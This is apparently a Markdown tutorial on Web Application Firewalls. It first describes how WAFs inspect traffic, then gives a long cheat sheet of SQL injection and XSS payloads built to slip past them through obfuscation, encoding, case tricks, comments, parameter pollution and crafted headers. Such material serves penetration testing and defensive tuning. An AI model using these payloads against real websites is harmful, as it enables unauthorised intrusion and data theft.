<img width="1939" height="966" alt="How-Does-a-Web-Application-Firewall-and-WAF-Rules-Work" src="https://github.com/user-attachments/assets/daef80b8-b32d-4af9-ab66-d6c78ff17331" />

##  What is a WAF?

A **Web Application Firewall (WAF)** is a security layer that sits between a user and a web application, analyzing incoming HTTP/HTTPS traffic to detect and block malicious input before it reaches the server.

Unlike network firewalls, which protect infrastructure, a WAF focuses on **application-level attacks** like:

* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Remote Code Execution (RCE)
* Local File Inclusion (LFI), and more.

---

##  Types of WAF

### 1. **Network-based WAF**

* Deployed at the network level.
* Usually hardware-based or part of load balancers.
* High performance and low latency.

### 2. **Host-based WAF**

* Installed directly on the server (as a module or software).
* More customizable.
* May affect server performance.

### 3. **Cloud-based WAF**

* Provided by third parties (e.g., Cloudflare, AWS WAF, Akamai, Imperva).
* Easy to deploy, scalable.
* Minimal control but fast setup.

---

##  How Does a WAF Work?

WAFs inspect HTTP requests and apply rules or signatures to detect malicious input patterns.
They analyze:

* HTTP Method (GET, POST, etc.)
* Request headers (User-Agent, Referer…)
* URL and parameters
* Cookies
* Payload content

They operate based on:

| Detection Type       | Description                                                           |
| -------------------- | --------------------------------------------------------------------- |
| **Signature-based**  | Matches known attack patterns (e.g., `UNION SELECT`, `<script>`).     |
| **Anomaly-based**    | Flags behavior that deviates from the norm (e.g., too many requests). |
| **Behavioral-based** | Learns application behavior and blocks unexpected usage.              |

---

##  Common Protection Mechanisms

* **Input validation & sanitization** (filters payloads).
* **Rate limiting** (blocks brute-force).
* **IP blacklisting / Geo-blocking**.
* **Blocking known attack strings**.
* **Blocking suspicious headers / User-Agents**.
* **JavaScript challenges / Captchas**.
* **Token validation** (CSRF tokens, encrypted URLs).
* **Regex pattern matching** in query or body.

---

##  Bypass Techniques 

Here’s how attackers often bypass weakly configured WAFs:

---

###  1. **Basic Obfuscation**

####  Concept:

Modify payloads to avoid detection by breaking known signatures.

#### Example – SQLi:

Instead of:

```
?id=1 OR 1=1
```

Try:

```
?id=1 /*!or*/ 1=1
?id=1 oorr/**/1=1
?id=1%09OR%091=1
```

####  Example – XSS:

```
<script>alert(1)</script>
```

Bypass using:

```
<scr<script>ipt>alert(1)</scr<script>ipt>
<svg onload=alert(1)>
"><img src=x onerror=alert(1)>
```

---

###  2. **Encoding Payloads**

* **URL Encoding**:

  ```
  <script> → %3Cscript%3E
  ```

* **Double Encoding**:

  ```
  %3C → %253C
  ```

* **Base64 Encoding**:
  Encode payload, decode it client-side.

####  Example:

XSS payload base64 encoded:

```html
<script>eval(atob("YWxlcnQoMSk="))</script>
```

---

###  3. **Case Manipulation**

WAFs may match only lowercase/uppercase payloads.

```sql
uNIoN SeLEct username, password FROM users
```

```html
<ScRiPt>alert(1)</ScRiPt>
```

---

###  4. **Whitespace/Comment Injection**

Break up patterns using:

* Tabs (`%09`)
* Newlines (`%0a`)
* Comments (`/**/` in SQL)

####  Example:

```sql
?id=1/**/UNION/**/SELECT/**/1,2--
```

---

###  5. **Using Non-standard HTTP Methods**

Some WAFs only inspect `GET` and `POST`. Try:

* `PUT`
* `HEAD`
* `OPTIONS`
* `TRACE`

Send payloads via these methods if the server supports them.

---

### 6. **Payload Fragmentation**

Send the payload in **chunks** or in **multiple requests**, which WAFs may not reassemble.

Example:
Use JavaScript to combine strings:

```javascript
<script>
  var a = "ale";
  var b = "rt(1)";
  eval(a + b);
</script>
```

---

###  7. **HTTP Parameter Pollution**

Send multiple parameters with the same name:

```
?id=1&id=2&id=UNION SELECT 1,2
```

Some WAFs ignore duplicates, but the server may process the malicious one.

---

###  8. **Bypassing via Alternate Encodings**

* **Unicode**:
  `%u003Cscript%u003Ealert(1)%u003C/script%u003E`
* **UTF-7**:

  ```html
  +ADw-script+AD4-alert(1)+ADw-/script+AD4-
  ```

---

###  9. **Using JSON/XML**

WAFs might not inspect **POST bodies** with `Content-Type: application/json` or `application/xml`.

Example:

```json
{"username":"admin' OR 1=1 --"}
```

---

###  10. **Manipulating Headers**

Use uncommon headers to deliver payloads:

```http
X-Forwarded-Host: evil.com
X-Original-URL: /admin
X-Custom-Payload: <script>alert(1)</script>
```

---

##  WAF Detection & Fingerprinting

###  Tools:

| Tool           | Usage                          |
| -------------- | ------------------------------ |
| **wafw00f**    | Detect WAF presence and vendor |
| **nmap**       | `--script http-waf-detect`     |
| **WhatWaf**    | Detect and bypass WAFs         |
| **Burp Suite** | Manual WAF response analysis   |
| **WAFHunter**  | Advanced evasion techniques    |

---

##  Real-world WAF Vendors

* **Cloudflare**
* **Imperva Incapsula**
* **Akamai Kona Site Defender**
* **AWS WAF**
* **F5 BIG-IP ASM**
* **ModSecurity** (open-source)

Each vendor has specific filtering methods and behavior. Bypass tricks may vary depending on the target.

---

##  Example Test Cases

###  SQLi Bypass Attempts:

```sql
?id=1' or '1'='1
?id=1'/**/OR/**/'1'='1
?id=1%27or%271%27=%271
```

###  XSS Bypass Attempts:

```html
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)">
<scr<script>ipt>alert(1)</scr<script>ipt>
```

---

##  Summary 

| Technique                | Description                             |
| ------------------------ | --------------------------------------- |
| Obfuscation              | Break the signature using syntax tricks |
| Encoding                 | Hide payload using URL/Base64           |
| Whitespace/Comment       | Inject breaks in patterns               |
| Case Manipulation        | Bypass case-sensitive filters           |
| JSON/XML Injection       | Send payload in unfiltered body formats |
| Header Injection         | Deliver payloads via unusual headers    |
| HTTP Method Manipulation | Use non-standard verbs like PUT/OPTIONS |
| Payload Fragmentation    | Split payload into separate parts       |
| WAF Detection Tools      | Use tools like wafw00f to identify WAF  |

---
